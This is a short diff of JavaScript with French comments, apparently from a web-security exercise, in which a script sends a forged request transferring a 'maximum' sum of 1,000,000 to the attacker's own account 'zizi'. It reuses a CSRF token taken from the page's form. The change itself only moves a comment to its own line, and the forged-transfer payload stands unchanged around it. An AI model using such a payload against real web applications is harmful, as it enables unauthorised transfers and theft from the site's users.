@@ -10,7 +10,8 @@
       // Définir les paramètres du transfert
       var recipient = "zizi"; // Votre compte
       var amount = 1000000; // Le montant maximum
-      var token = "6757059b4f9a22da000000"; // Le token CSRF visible dans le formulaire
+      var token = "6757059b4f9a22da000000";
+      // Le token CSRF visible dans le formulaire
 
       // Envoyer la requête
       xhr.send(`recipient=${recipient}&amount=${amount}&token=${token}`);
